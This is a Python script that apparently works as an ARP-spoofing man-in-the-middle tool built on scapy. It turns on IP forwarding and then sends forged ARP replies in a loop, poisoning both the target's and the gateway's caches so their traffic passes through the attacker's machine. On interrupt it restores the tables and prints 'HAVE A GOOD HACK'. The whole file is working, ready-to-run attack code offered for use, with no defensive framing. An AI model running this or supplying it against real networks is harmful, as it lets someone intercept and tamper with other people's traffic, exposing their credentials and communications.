import scapy.all as scapy
import optparse
import os
import time

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("figlet mitm")

def input():

	object1 = optparse.OptionParser()
	object1.add_option("-t" , "--target" , dest = "target" , help = "enter target ip")
	object1.add_option("-g" , "--gateway" , dest = "gateway" , help = "enter gateway ip")
	return object1.parse_args()

def mac(ip):

	request = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
	entire = broadcast/request
	(answered , unanswered) = scapy.srp(entire , timeout = 1 , verbose = False)
	mac = answered[0][1].hwsrc
	return mac

def mitm(ip1 , ip2):

	macadress = mac(ip1)
	response = scapy.ARP(op = 2 , pdst = ip1 , hwdst = macadress , psrc = ip2)
	scapy.send(response , verbose = False)

def fixing(ip1 , ip2):
	mac1 = mac(ip1)
	mac2 = mac(ip2)
	response = scapy.ARP(op = 2 , pdst = ip1 , hwdst = mac1 , psrc = ip2 , hwsrc = mac2)
	scapy.send(response , verbose = False , count = 4)

(inputs , argument) = input()
target = inputs.target
gateway = inputs.gateway

index = 0

try:

	while True:

		mitm(target , gateway)
		mitm(gateway , target)

		index += 1

		print("\r{} packet has sended".format(index) , end = "")

		time.sleep(2)

except KeyboardInterrupt:

	fixing(target , gateway)
	fixing(gateway , target)

	print("\nHAVE A GOOD HACK")

